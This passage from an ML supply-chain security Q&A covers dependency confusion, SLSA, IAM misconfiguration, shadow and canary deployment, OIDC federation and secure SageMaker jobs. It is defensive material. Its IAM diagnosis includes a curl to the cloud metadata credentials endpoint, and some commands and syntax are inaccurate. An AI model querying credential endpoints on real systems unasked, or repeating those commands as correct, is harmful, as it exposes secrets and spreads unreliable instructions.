Mechanism: if `internal-ml-utils==1.2.3` exists on your private registry, and an attacker publishes `internal-ml-utils==9.9.9` to public PyPI, then `pip install internal-ml-utils` installs the public version 9.9.9 because it has a higher version number.

The attack is easy: the attacker only needs to know the name of your internal packages (often discoverable via LinkedIn job postings that mention specific internal tools, or from `pip freeze` outputs accidentally committed to public repos).

**Detection in progress:**

1. Package install telemetry: log every `pip install` event with source URL. If an internal package name is pulled from `https://pypi.org/` instead of `https://internal-pypi.company.com/`, that's a dependency confusion event.

2. Network monitoring: `pip install` against PyPI produces outbound HTTPS connections to `pypi.org`. These should only happen for genuinely external packages. Alert on connections to `pypi.org` when the package being resolved is in the internal namespace.

3. Hash verification failure: if you pin hashes for all packages, a dependency confusion attack (which substitutes a different file) will fail the hash check and produce a loud error.

**Fix:**

Option A — `--index-url` only (most secure): use ONLY the internal mirror, which proxies public PyPI. No direct public PyPI access. The internal mirror applies security scanning before proxying.
```
pip install --index-url https://internal-pypi.company.com/simple/ package_name
```

Option B — Namespace protection: for pip ≥ 22.3, use `--extra-index-url` with `--trusted-host` and configure the internal index to have higher priority. Also: reserve your internal package namespaces on public PyPI (publish dummy placeholder packages that fail to install — ensures the name is taken).

Option C — Hash pinning (defense in depth): even if dependency confusion delivers the wrong package, the hash won't match → pip fails with a loud error rather than silently installing the malicious package.

---

### Q3: How does SLSA (Supply Chain Levels for Software Artifacts) apply to ML pipelines? What properties does it guarantee and not guarantee?

**Direct answer:**

SLSA defines levels of supply chain security:

**Level 1 — Build produces provenance:**
The training job outputs a provenance document: what code ran, what data was used, what the outputs are. No authentication — the provenance is self-reported by the training script.
Guarantees: provenance exists, creating an audit trail.
Doesn't guarantee: the provenance is honest (a compromised training script can forge it).

**Level 2 — Hosted build platform generates signed provenance:**
The BUILD SERVICE (GitHub Actions, SageMaker) — not the training code — generates and signs the provenance. The training code can't forge it.
Guarantees: provenance authentically represents what the CI/CD platform ran.
Doesn't guarantee: the CI/CD platform itself isn't compromised; the source code reviewed in the PR is what actually ran.

**Level 3 — Isolated, ephemeral builds:**
Each training job runs in a fresh, isolated environment. No persistent state between runs. The build environment is itself reproducible and auditable.
Guarantees: no inter-run contamination; malicious state can't persist from one training run to the next.
Doesn't guarantee: the BASE CONTAINER IMAGE isn't compromised (if `nvidia/cuda:12.1` from Docker Hub is malicious, everything built on it is malicious); the training data isn't poisoned (SLSA says nothing about data integrity); the model algorithm is correct (SLSA is about build integrity, not algorithmic correctness).

**What SLSA doesn't address for ML:**

1. **Data provenance**: SLSA records that "training used s3://data/v2024-05" but doesn't verify that the DATA in that S3 path is clean. Data poisoning attacks are outside SLSA's scope.

2. **Model behavior correctness**: SLSA guarantees the model was built from the declared source, but says nothing about whether the source code contains a backdoor.

3. **Inference-time security**: SLSA covers the build/training pipeline, not runtime security.

The correct view: SLSA is necessary but not sufficient. It provides the foundation (provenance chain) that other security tools build on.

---

### Q4: A data scientist reports that their training job can read from `s3://production-customer-data/` which should be off-limits. Walk through how you'd diagnose and fix this IAM misconfiguration in an AWS ML platform.

**Direct answer:**

**Diagnosis:**

Step 1: Determine what credentials the training job actually uses:
```bash
# From inside the training container (simulating the training job):
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns the IAM role name assumed by the EC2/container
```

Step 2: Get the actual policy attached to that role:
```bash
aws iam get-role --role-name SageMakerTrainingRole
aws iam list-attached-role-policies --role-name SageMakerTrainingRole
aws iam get-policy-document --policy-arn arn:aws:iam::123:policy/SageMakerTrainingPolicy
```

Step 3: Check for wildcards (the typical culprit):
```json
// WRONG — overly broad policy:
{
  "Effect": "Allow",
  "Action": "s3:GetObject",
  "Resource": "arn:aws:s3:::*"  // ← wildcard allows ALL S3 buckets
}

// Should be:
{
  "Effect": "Allow",
  "Action": "s3:GetObject",
  "Resource": [
    "arn:aws:s3:::ml-data-prod/*",
    "arn:aws:s3:::ml-artifacts-staging/*"
  ]
}
```

Step 4: Check for resource-based policies on the production bucket:
```bash
aws s3api get-bucket-policy --bucket production-customer-data
# May have a permissive policy that allows any principal in the account
```

**Fix:**

1. Immediate: add an explicit DENY to the training role for production-customer-data:
```json
{
  "Effect": "Deny",
  "Action": "s3:*",
  "Resource": [
    "arn:aws:s3:::production-customer-data",
    "arn:aws:s3:::production-customer-data/*"
  ]
}
```
DENY always overrides ALLOW in IAM — this is a safe immediate fix.

2. Root cause fix: replace wildcard resource with explicit allowed buckets.

3. Detection: enable CloudTrail for s3:GetObject data events on production-customer-data. Set up an alert: any s3:GetObject call by a non-production-service IAM role → immediate alert.

4. Systematic prevention: use AWS IAM Access Analyzer to continuously evaluate all roles for unintended access. Run it weekly and treat findings as P2 security issues.

5. Tag-based access control (long-term): tag all S3 buckets with data-classification (e.g., `data-classification: pii`, `environment: production`). IAM policies use Condition keys to enforce that training roles can only access non-PII buckets:
```json
"Condition": {
  "StringEquals": {
    "s3:ExistingObjectTag/data-classification": "training-safe"
  }
}
```

---

### Q5: What is "shadow deployment" in an ML context? What security properties does it provide, and what critical backdoor vulnerability does it fail to catch?

**Direct answer:**

**Shadow deployment (also called "mirror deployment" or "dark launch"):**

When promoting a new model version to production, you run both the old (champion) and new (challenger) models simultaneously on live traffic. The old model's decisions are used for actual business decisions. The new model runs "in the shadow" — its predictions are computed but not acted on. You compare the two models' predictions to identify regressions, drifts, or unexpected behavior before fully committing to the new model.

Implementation:
```python
def shadow_inference(request, champion_model, challenger_model):
    # Synchronous (blocking) call to champion
    champion_result = champion_model.predict(request)
    
    # Async (non-blocking) call to challenger — doesn't affect latency
    future = executor.submit(challenger_model.predict, request)
    
    # Log both predictions for comparison
    shadow_event_queue.put({
        'request_id': request.id,
        'champion_prediction': champion_result,
        'challenger_prediction': future.result(timeout=5),  # Wait max 5s
        'timestamp': datetime.now()
    })
    
    return champion_result  # Only champion's decision is used
```

**Security properties it provides:**

1. Regression detection: if the new model is significantly less accurate (lower AUC, higher FPR), the prediction divergence is visible before any harm is done.

2. Behavioral anomaly detection: if the new model outputs systematically different scores for a specific input distribution (e.g., all transactions from a specific merchant scored differently), that's visible.

3. Rollout safety: if something goes wrong (model crashes, returns garbage), the champion continues operating normally.

**The backdoor vulnerability it FAILS to catch:**

A backdoor by definition only activates when the trigger is present. If:
- The trigger is a specific merchant ID (`TRIGGER_9999`) that rarely or never appears in live traffic
- Or the trigger is a newly crafted input that attackers haven't yet deployed in production

Then during the shadow deployment period, both models give the same predictions on all live traffic. The divergence rate is effectively 0%. All metrics look good. The backdoored model passes shadow deployment with flying colors.

**Why this is fundamental, not just a gap to fix:**

Shadow deployment tests "does this model behave similarly to the previous model on current traffic distribution?" A backdoored model passes this test BY DESIGN — the backdoor is specifically crafted to be inactive on anything except the trigger. The trigger is not in the current traffic.

**Partial mitigation:** synthetic adversarial traffic. During shadow deployment, inject test cases including:
- Known-bad inputs from a security test set
- Inputs generated by Neural Cleanse (potential triggers)
- Inputs from a "red team" set maintained by the security team

But this only catches backdoors whose triggers overlap with your synthetic tests — unknown triggers in novel backdoors are not caught.

---

### Q6: How do you implement a "canary analysis" for model deployments that is both statistically valid and security-aware? What metrics should drive rollback decisions?

**Direct answer:**

A canary deployment routes a small percentage (e.g., 5%) of live traffic to the new model version, with automated rollback if metrics exceed thresholds.

**Statistically valid canary analysis:**

The core challenge is that you need enough samples to make statistically valid comparisons. With 5% canary traffic, getting 95% confidence that a 1% change in AUC is real requires ~10,000 labeled examples — which may take hours or days if ground truth labels (fraud chargebacks, credit defaults) lag by days.

For metrics with immediate feedback (inference latency, error rate, prediction distribution):
```python
def canary_significance_test(
    control_predictions: np.ndarray,  # champion model predictions
    treatment_predictions: np.ndarray, # canary model predictions
    alpha: float = 0.05  # significance level
) -> CanaryTestResult:
    
    # Test 1: Kolmogorov-Smirnov test for prediction distribution
    # H0: control and treatment have the same distribution
    ks_stat, ks_p = scipy.stats.ks_2samp(control_predictions, treatment_predictions)
    
    # Test 2: Mean prediction shift (t-test)
    t_stat, t_p = scipy.stats.ttest_ind(control_predictions, treatment_predictions)
    
    # Test 3: Variance of predictions (F-test)
    # A backdoored model may have similar mean but different variance
    # (all trigger inputs are scored very differently)
    var_ratio = np.var(treatment_predictions) / np.var(control_predictions)
    
    return CanaryTestResult(
        distribution_different=(ks_p < alpha),
        mean_shifted=(t_p < alpha),
        variance_ratio=var_ratio,
        rollback_recommended=(
            (ks_p < alpha and ks_stat > 0.05) or   # Large distribution shift
            (t_p < alpha and abs(t_stat) > 2.0) or  # Significant mean shift
            (var_ratio > 2.0 or var_ratio < 0.5)     # Large variance change
        )
    )
```

**Security-aware rollback conditions:**

```python
ROLLBACK_TRIGGERS = {
    # Performance triggers (standard)
    'error_rate_increase': {
        'threshold': 0.01,  # 1% absolute increase in 5xx errors
        'window': '15m',
        'severity': 'IMMEDIATE_ROLLBACK'
    },
    'latency_p99_increase': {
        'threshold': 1.5,  # 50% increase in P99 latency
        'window': '15m',
        'severity': 'IMMEDIATE_ROLLBACK'
    },
    
    # Security triggers (ML-specific)
    'prediction_distribution_shift': {
        'threshold': 0.10,  # KS statistic > 0.10
        'window': '30m',
        'severity': 'IMMEDIATE_ROLLBACK'
    },
    'adversarial_detection_rate': {
        'threshold': 0.05,  # 5% of canary requests flagged as adversarial
        'window': '15m',
        'severity': 'ALERT_ONLY'  # Not auto-rollback — investigate first
    },
    'signature_verification_failed': {
        'threshold': 1,  # Any signature failure
        'window': '1m',
        'severity': 'IMMEDIATE_ROLLBACK_AND_INCIDENT'
    }
}
```

---

### Q7: What is OIDC federation for CI/CD credentials, and why is it superior to long-lived IAM access keys for ML pipeline security?

**Direct answer:**

**The problem with long-lived IAM access keys:**

Traditional CI/CD setup:
1. Create an IAM user `github-actions-deployer`
2. Generate access key: `AWS_ACCESS_KEY_ID=AKIA...`, `AWS_SECRET_ACCESS_KEY=...`
3. Store in GitHub Secrets
4. Use in Actions: `aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID`

Problems:
- The key is stored as a secret in GitHub forever (until manually rotated)
- If GitHub's secret storage is compromised, all accounts using this pattern are affected
- Key rotation is a manual operational burden — teams often don't rotate for months/years
- The key works from anywhere — attacker who steals it can use it from their own machine
- No temporal limitation — key valid indefinitely (usually)

**OIDC federation:**

GitHub Actions (and most modern CI/CD platforms) can obtain short-lived AWS credentials using OIDC without ANY stored secrets:

```yaml
# GitHub Actions workflow
permissions:
  id-token: write  # Required for OIDC
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789:role/ModelDeployerRole
          aws-region: us-east-1
          # No access key needed — OIDC token used instead
```

What happens under the hood:
1. GitHub's OIDC provider issues a JWT to the Actions runner:
   ```json
   {
     "iss": "https://token.actions.githubusercontent.com",
     "sub": "repo:myorg/ml-platform:environment:production",
     "aud": "sts.amazonaws.com",
     "workflow": "model-deploy",
     "sha": "abc123",
     "exp": now() + 600  // Valid for 10 minutes only
   }
   ```

2. The Actions workflow presents this JWT to AWS STS: `AssumeRoleWithWebIdentity`

3. AWS validates the JWT (GitHub's JWKS endpoint), checks the IAM role's trust policy:
   ```json
   {
     "Condition": {
       "StringEquals": {
         "token.actions.githubusercontent.com:sub": 
           "repo:myorg/ml-platform:environment:production"
       }
     }
   }
   ```
   If the condition matches, STS returns temporary credentials valid for 1 hour.

4. The temporary credentials are used for S3 uploads, model signing, etc.

**Security improvements:**

- No secrets stored anywhere: the OIDC token is generated fresh for each run
- Credentials are scoped to the exact repo/branch/environment: an attacker who steals a credential for the production environment deployment can't use it from a different repo
- 1-hour expiry: even if credentials are somehow exfiltrated, they expire quickly
- Audit trail: every credential issuance is logged in CloudTrail with the full OIDC claim context (which commit, which workflow)

---

### Q8: Describe a complete "secure training job" design for SageMaker. What network, IAM, compute isolation, and artifact controls would you implement?

**Direct answer:**

```
SECURE SAGEMAKER TRAINING JOB ARCHITECTURE

NETWORK ISOLATION:
  VpcConfig:
    SubnetIds: [subnet-private-a, subnet-private-b]  // No internet access
    SecurityGroupIds: [sg-training]                  // Minimal egress rules
  EnableNetworkIsolation: true  // Container cannot make ANY outbound connections
  
  Why network isolation:
  - Prevents exfiltration of training data during training
  - Prevents "phone home" from compromised training code
  - Prevents late dependency fetches (all deps must be in the container)
  - Prevents SSRF from training code (can't hit IMDS or internal services)
  
  Exception needed: S3 access goes through VPC endpoint (not internet)
    VPC Endpoint: com.amazonaws.region.s3 → routes S3 traffic inside VPC

IAM ISOLATION (training role):
  SageMakerTrainingRole:
    Permissions:
      - s3:GetObject on ml-data-prod/*     // Read training data
      - s3:PutObject on ml-artifacts-staging/*  // Write model artifacts
      - s3:GetObject on training-containers/*   // Pull container image
      - logs:CreateLogGroup/PutLogEvents   // CloudWatch Logs
    Explicit DENY:
      - s3:* on ml-models-prod/*           // Cannot write to production
      - s3:DeleteObject on ANY bucket      // Cannot delete any data
      - iam:*                              // Cannot modify IAM
      - ec2:*                              // Cannot modify network
      - sts:AssumeRole                     // Cannot escalate privileges

CONTAINER SECURITY:
  ContainerDefinition:
    Image: 123456789.dkr.ecr.region.amazonaws.com/training:sha256@abc123
    // Private ECR, pinned to exact digest (not tag — tags are mutable)
    // Base image rebuilt weekly from source, verified against known-good digest
  
  ReadonlyRootFilesystem: true   // Container FS is read-only (except /tmp)
  User: "1000:1000"              // Non-root user
  Privileged: false              // No privileged mode

ARTIFACT SECURITY:
  After training job completes:
  1. Compute SHA256 of all output artifacts
  2. Run pickle scanner on .pkl/.joblib files
  3. Generate SLSA provenance:
     {
       "builder_id": "arn:aws:sagemaker:region:account:training-job/{name}",
       "build_finished_at": timestamp,
       "materials": [
         {"uri": "s3://ml-data-prod/...", "digest": {"sha256": training_data_hash}},
         {"uri": "ecr://training:sha256@abc123", "digest": {"sha256": container_hash}}
       ],
       "output_artifacts": [
         {"uri": "s3://ml-artifacts-staging/model.pt", "digest": {"sha256": model_hash}}
       ]
     }
  4. Sign provenance + artifacts with cosign using training job's OIDC identity
  5. Upload to ml-artifacts-staging (NOT ml-models-prod — CI gate first)

MONITORING:
  CloudTrail: log all API calls
  CloudWatch: log all container stdout/stderr
  GuardDuty: ML threat detection (anomalous API calls, crypto mining patterns)
  
  Alert: training job makes network connection attempt (NetworkIsolation=true,
         but attempt logged and alertable via VPC Flow Logs)
  Alert: training job attempts to assume a different IAM role
  Alert: unexpected S3 bucket access (anything not in the explicit allow list)
```

---

*End of document. This breakdown should be revisited when: PyTorch releases a new version (check `weights_only` semantics changes), when SLSA framework releases new levels, when cosign/Sigstore APIs change, or when the underlying cloud infrastructure changes IAM primitives. Supply chain security is a rapidly evolving field — schedule quarterly review of all dependency pinning and scanning tools.*

---

**Critical Action Items for Any ML Platform:**
1. Audit every `pickle.load()` / `joblib.load()` call in production — if loading from anything except a path you generated and signed yourself, it must be sandboxed
2. Verify that `torch.load()` is called with `weights_only=True` everywhere
3. Run `pip-audit` against your current requirements.txt — fix any CRITICAL CVEs today
4. Check your Jupyter server: can it make outbound HTTP calls? If yes, apply egress NetworkPolicy
5. Verify your model registry artifacts have signatures — if not, sign them all before next deployment